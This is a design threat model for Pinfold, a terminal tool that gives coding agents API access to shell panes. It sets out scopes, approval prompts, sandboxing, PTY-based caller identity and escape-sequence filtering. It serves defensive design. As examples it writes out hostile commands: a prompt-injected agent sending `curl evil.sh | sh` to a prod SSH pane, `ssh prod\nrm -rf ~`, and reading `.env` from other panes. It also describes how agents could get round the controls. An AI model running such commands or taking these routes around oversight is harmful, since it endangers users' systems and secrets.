# Threat model

This document is the source of truth for Pinfold's security design. It restates the
Security design section of [`architecture.md`](architecture.md) as amended by review
finding B1 in [`architecture-review.md`](architecture-review.md) and by
[ADR-0004](../adr/0004-agent-identity-from-pty.md),
[ADR-0010](../adr/0010-security-model.md),
[ADR-0020](../adr/0020-identity-hardening.md) and
[ADR-0028](../adr/0028-windows-are-spawned-by-the-core.md). Bearer tokens, `PINFOLD_TOKEN` and the
owner token no longer exist, whatever older text says.

**Status: design.** None of these controls is implemented yet. The milestone table at
the end says when each one lands.

## The honest summary

Pinfold gives coding agents a programmable channel into your shells. Agents act on
untrusted text, so a prompt-injected agent could try to type into your production SSH
session from another pane.

**The API controls are guardrails, not a security boundary.** An unsandboxed agent runs
as your user. It can read your files, edit your config, and use its own shell instead
of the API. The controls here stop injected instructions that use Pinfold's API, and
they make misuse visible. **Only a sandboxed agent is contained.**

## What we protect

| Asset                                     | Why it matters                                                                |
| ----------------------------------------- | ----------------------------------------------------------------------------- |
| Shell sessions                            | Each runs with your full user rights, and some are root or production SSH     |
| Scrollback and screen contents            | Often hold secrets: tokens printed by CLIs, `.env` files, connection strings  |
| Clipboard                                 | Holds passwords and keys; writable by escape sequences                        |
| Session snapshots, spill files, audit log | Secrets at rest on disk                                                       |
| Config, hooks, plugins, agent profiles    | They define what runs, so tampering with them means code execution            |
| Webhook and notification channels         | The only ways data leaves the machine                                         |

## Scope

- **In scope:** the threats below, and escape from a sandboxed agent profile.
- **Not defended:** actions an unsandboxed agent takes with its own user rights outside
  the API. Pinfold reduces the damage of these (window confirmation of config changes,
  a tamper-evident audit log) but cannot prevent them. In particular, without a sandbox
  Pinfold cannot stop same-user ptrace of another pane's processes, where the OS allows
  it, or writes to another pane's terminal. Those writes reach that pane's VT parser as
  program output, not its input.
- **Out of scope:** root and kernel compromise.

## Threats

| #   | Threat                                                   | Example                                                                                            | Primary control                                                                                                |
| --- | -------------------------------------------------------- | -------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| T1  | A prompt-injected agent moves sideways to another pane   | Agent in pane 3 sends `curl evil.sh \| sh` to your prod SSH pane                                   | PTY-derived identity; scopes; approval prompt; protected panes; sends split at newlines                        |
| T2  | An agent reads secrets from other panes                  | `pane.read` on a pane that just ran `cat .env`                                                     | Read of other panes needs approval; secret redaction                                                           |
| T3  | Hostile program output abuses escape sequences           | Title-report sequence echoes attacker text into the shell's input; OSC 52 reads the clipboard      | Reply sequences disabled; clipboard read off; length limits                                                    |
| T4  | Spoofed status or alerts                                 | Output prints a fake OSC 133 "done", or floods OSC 9 notifications                                 | Output-reported status labelled as such; API status from a PTY-identified caller outranks it; rate limits      |
| T5  | Malicious repo content                                   | `.pinfold/layout.toml` runs commands on `pinfold up`; `git diff` runs a hostile `core.fsmonitor`   | Workspace trust prompt; hardened git invocation                                                                |
| T6  | Hostile files in the built-in tools                      | Escape bytes or Trojan Source bidi characters in a filename; a file that stalls the highlighter    | Control and bidi characters shown escaped; size and time caps                                                  |
| T7  | Paste injection                                          | Pasted text containing `ESC[201~` ends bracketed paste early and runs the rest                     | Strip paste terminators and control characters; multi-line paste warning                                       |
| T8  | Another local user or a sandboxed app reaches the socket | Shared host; Flatpak app with a socket portal                                                      | 0700 directory, 0600 socket, peer UID check, PTY-derived identity                                              |
| T9  | Secrets leak at rest or over the network                 | Snapshot with scrollback copied off the disk; webhook carries output                               | Scrollback snapshots off by default and redacted; in-memory key for spill files; webhooks carry status only    |
| T10 | Parser bugs or supply-chain compromise                   | Crafted output crashes the VT parser; a bad crate update                                           | `unsafe` only in `pinfold-sys`; fuzzing; `cargo-deny`, `cargo-vet`; signed releases; core isolated from the UI |

Each threat needs at least one test proving its control works.

## Trust boundaries

`pinfold-core` is the trusted code. The window process hosts rendering and the built-in
tools, and it can crash or restart without touching a PTY. Four kinds of input cross
into the core:

- **API callers** are identified from their PTY, never from something they present.
- **Program output** passes the escape-sequence filter, and only changes what is drawn.
- **Pastes and files** pass sanitizers, and never become keystrokes on their own.
- **Window messages** come only over a link the core made, and cannot panic it.

## Caller identity

1. **Peer check.** The core accepts a connection only if the peer's UID matches its own.
   The socket directory is 0700 and the socket 0600. The core refuses to start if the
   directory is a symlink or owned by someone else.
2. **PTY mapping.** The core reads the peer's pid (`SO_PEERCRED` on Linux,
   `LOCAL_PEERPID` on macOS), finds its controlling terminal and session, and maps that
   to a pane. A caller must hold the pane's terminal and be in its session. On Linux,
   `SO_PEERPIDFD` guards this lookup against pid reuse. A pane's environment holds no credential, so reading another pane's
   environment gives nothing. The pair is read once, at accept, and mapped to a pane on each
   request, so a pane that closes stops matching.

   macOS does not use `LOCAL_PEERTOKEN`. Its audit token carries the pid version, but no
   public call checks a running process against it or reads a terminal by it, so it cannot
   close the race. macOS, like Linux before 6.5, keeps the window from `connect` to the lookup
   at accept: a caller that exits there and whose pid then goes to a process in another pane's
   session would be taken for that pane. The caller cannot choose which process gets its pid.
3. **No terminal.** A caller with no controlling terminal is unidentified and gets no
   pane scopes. An MCP server must stay in its agent's session.
4. **Outside a pane.** No token exists on disk. An owner-level action from outside a
   pane needs a one-time confirmation drawn in the Pinfold window.

5. **Window link.** A window can read and write every pane, so it never connects by name.
   The core makes a socketpair and starts the window itself, and that inherited descriptor
   is the only way in ([ADR-0028](../adr/0028-windows-are-spawned-by-the-core.md)). A caller
   on the control socket can ask for a window to open, with no arguments, and gets no channel
   into a pane. The window sets the same hardening as the core.
6. **Core hardening.** Before opening any PTY, the core sets `PR_SET_DUMPABLE(0)` on Linux
   and `PT_DENY_ATTACH` on macOS. Neither reaches a pane: `exec` clears both, so you can
   debug your own programs in a pane. What each stops was measured with
   [`tests/hardening/audit.sh`](../../tests/hardening/audit.sh), and
   `crates/pinfold-cli/tests/session.rs` fails if the core or a pane changes side.

   | Same-user attempt on the core                  | Linux    | macOS, plain build              | macOS, hardened runtime |
   | ---------------------------------------------- | -------- | ------------------------------- | ----------------------- |
   | `ptrace` attach                                | Refused  | Refused, attacker gets SIGSEGV  | Refused, same           |
   | Copy a PTY master (`pidfd_getfd`)              | Refused  | No such call                    | No such call            |
   | Task port, signed with the debugger entitlement | No such call | **Granted: memory was read** | Refused                 |
   | Apple's `vmmap` and `leaks`                    | No such tool | Work: region and heap sizes | Work: same              |

   A plain macOS build is therefore not safe from a same-user process that can ad-hoc sign a
   program, which needs no admin rights and no Developer Mode. That task port reads the core's
   memory, and a task port normally allows writes too, which was not tried. `PinFold.app` is
   signed with the hardened runtime for this reason. A `cargo` build is not.

   These stay open on purpose. `pinfold-core --idle <panes>` and `--window` skip hardening so
   that the core can be measured and debugged, and any same-user process can run them. If one
   owns the socket, `pinfold` uses it. That gives an attacker nothing new, as a same-user
   process could equally start its own program there and the launcher checks only the owner. A
   core started under a tracer stays traced on Linux, where the tracer keeps its registers but
   loses its memory reads, and exits with status 45 on macOS. Apple's tools read sizes, and
   `gcore` was refused and a `leaks` memory graph did not hold a marker printed in a pane.

The [M0 spike](../spikes/m0-caller-identity/README.md) showed on Linux and macOS that a
process in pane A was never identified as pane B through the API, even with pane B's full
environment.

### Still open

- Whether a build without the hardened runtime, such as Homebrew building from source, should
  refuse to run a session or warn about it. Only the core and window of `PinFold.app` have it.
- How sandboxed agents block TIOCSTI while staying in their pane's session, tested with
  real bubblewrap and `sandbox-exec`.

## Authorization

An agent fully controls the panes it created. Anything else needs a grant from you.

| Scope                   | Default for an agent pane | Covers                                                    |
| ----------------------- | ------------------------- | --------------------------------------------------------- |
| `self`                  | Granted                   | Read, send to and set status on its own pane              |
| `spawn`                 | Granted                   | Create panes; the agent then has full control of them     |
| `children`              | Granted                   | Read, send, wait on and close panes it spawned            |
| `notify`                | Granted (rate-limited)    | Raise alerts about its own panes                          |
| `tool.open`             | Granted                   | Open md, files or diff for you to see                     |
| `pane.read:other`       | Asks you                  | Read any pane it did not create                           |
| `pane.send:other`       | Asks you                  | Type into any pane it did not create                      |
| `session.*`             | Denied                    | Save, restore or kill sessions                            |
| `config.*`, `webhook.*` | Never over the API        | Changing config or alert destinations is config-file only |

**Approval.** A cross-pane action raises a prompt drawn by the window, outside pane text.
It shows the caller, target, action and the exact text to be sent. Only your keyboard
can answer it. Grants apply to one caller, target and action, and expire after 30
minutes (review finding M5). Related prompts are batched to reduce click-through.

**Protected panes** refuse API writes even with a grant. A pane is protected when:

- its foreground process matches a rule by name (`ssh`, `sudo`, `su`, `doas`, `mosh`,
  and others you add) or by command-line pattern (for `kubectl exec`, `docker exec`,
  `psql` or `aws ssm`), or it runs as root
- a password prompt is active (the PTY has echo turned off)
- you marked it

You can unlock a protected pane for one action with a key press. Reads of protected
panes are redacted.

**Sends to other panes split at newlines.** The core re-checks the foreground process
and waits about 150 ms between lines, so `ssh prod\nrm -rf ~\n` cannot pass the check
on the first line and land in ssh on the second.

**Secret redaction.** Text returned for any pane other than the caller's own passes a
redaction filter, as does anything written to a snapshot. It replaces likely secrets
with `«redacted:kind»`.

**Security-relevant config changes** (approval policy, redaction, webhooks, auto-rerun)
do not apply on hot reload until you confirm a diff in the window. Files writable by
group or others, or not owned by you, are refused.

**Audit log.** Each API call is recorded with caller, method, target, scope and result
in a hash chain. The in-memory copy is the source of truth, because an agent running as
you can rewrite the file on disk. A hash chain cannot show that entries were cut from its
tail, since a shortened chain is still valid.

**Limits.** Requests over 1 MB are rejected. `pane.send` is capped at 4 KB per call and
20 calls per second per caller, and reads at 2 MB per call. Cold scrollback is capped at 2
MB per pane by default, because hostile output can defeat a line limit.

**Sandbox.** An agent profile may set `sandbox`, which launches the agent under
bubblewrap or Landlock on Linux and `sandbox-exec` on macOS, or under the agent CLI's own
sandbox mode. The sandbox hides `~/.ssh`, `~/.config/pinfold`, `~/.local/state/pinfold`
and other users' panes. Sandboxed agents run inside their pane's session, so they keep
their identity. Everything a sandboxed agent starts stays sandboxed: it, and every pane
under it, may start only sandboxed agent profiles (`agent.launch`) in its own working
directory, and `pane.spawn`, which runs the user's plain shell, is refused. The core
records each sandboxed pane's working directory when it launches it, as OSC 7 from the
agent cannot be trusted. Not a directory inside it: on Linux the agent could swap that
for a symlink before bubblewrap binds it, but it cannot rename its own working directory or
what is above it. `pane.send` without approval reaches only the caller's own pane
and those it spawned, which are then sandboxed too. A send to any other pane needs the
person's approval in the window, so a grant the person gives a sandboxed agent lets it type
outside its sandbox. `workspace.open`, `session.save`, workspace trust and grant
administration need a caller in a terminal outside every pane, which a sandboxed agent
cannot be. A caller with no terminal is unidentified, and the sandbox cannot open a new
terminal, whose session no pane would hold: on macOS `sandbox-exec` denies every
`/dev/ttys*` by name, so `openpty` fails, and on Linux bubblewrap's private `/dev` has an
empty `/dev/pts`, so `/dev/ptmx` leads nowhere. The agent keeps the terminal it was started
on. `a_sandboxed_agent_cannot_open_a_new_terminal` in `crates/pinfold-core/tests/sandbox.rs`
checks both with the real tools. A restored session runs shells, never agents, and no
agent runs in them.

## Hardening untrusted input

Bytes from programs, files and repos may change what is drawn. They never become
keystrokes, run commands or leave the machine without your action.

| Sequence                                                       | Risk                                              | Default                                                             |
| -------------------------------------------------------------- | ------------------------------------------------- | ------------------------------------------------------------------- |
| Title report (`CSI 21 t`), DECRQSS, queries that echo strings  | Attacker text written into the shell's input      | Not answered; only fixed-format replies such as cursor position     |
| OSC 52 clipboard                                               | Steal the clipboard, or plant a malicious command | Read off. Write allowed with a status-bar flash, max 64 KB          |
| OSC 8 hyperlinks                                               | Link text that hides the real target              | Real URL shown on hover; `http(s)` on Ctrl + click; others ask      |
| OSC 9 / 777 notifications                                      | Spam, or alerts that look like system ones        | 1 per 10 s per pane; sanitized and prefixed with the pane name      |
| OSC 133 marks                                                  | Fake "done" or exit codes                         | Shown as "reported by output"; API status outranks them             |
| OSC 7 cwd                                                      | Path traversal into restore and the file manager  | Must be an existing absolute directory; used only as a hint         |
| Very long sequences, titles, hyperlinks                        | Memory exhaustion                                 | Caps: 4 KB per sequence, 256 B per title, 2,000 hyperlinks per pane |

The paste sanitizer, markdown reader, file manager, git invocation, workspace trust,
snapshot and spill-file rules are in the Security design section of
[`architecture.md`](architecture.md#security-design). They stand unchanged.

## Secure defaults

| Setting                                             | Default                                 | Who can change it                 |
| --------------------------------------------------- | --------------------------------------- | --------------------------------- |
| Agent access to other panes                         | Ask each time                           | You, per grant                    |
| Writes to protected panes                           | Blocked                                 | You, one action at a time         |
| Redaction of cross-pane reads                       | On                                      | Config, confirmed in the window   |
| Clipboard read by programs (OSC 52)                 | Off                                     | Config only                       |
| Scrollback in snapshots                             | Off                                     | Config, per session               |
| Network listeners                                   | None                                    | Not available in v1               |
| Webhook content                                     | Status only                             | Not changeable                    |
| Repo layouts                                        | Ask before first run and on any change  | You                               |

## Security work per milestone

| Milestone  | Deliverables                                                                                       |
| ---------- | -------------------------------------------------------------------------------------------------- |
| Phase 0    | `unsafe` lint policy, `cargo-deny` and `cargo-audit` in CI, this document                          |
| M0         | Caller-identity proof on Linux and macOS (done)                                                    |
| M1         | Escape-sequence policy, paste sanitizer, scrollback byte cap, fuzzing of the VT input path         |
| M2         | Core hardening, socket directory checks, peer UID check, window link                               |
| M3         | Scopes, approvals, protected panes, newline splitting, redaction, audit log, sandbox, API fuzzing  |
| M4         | Filename and markdown sanitizing, hardened git invocation, tool size and time caps                 |
| M5         | Workspace trust, encrypted spill files, snapshot redaction, signed and notarized releases          |
| Before 1.0 | External penetration test focused on the agent API and escape-sequence handling                    |
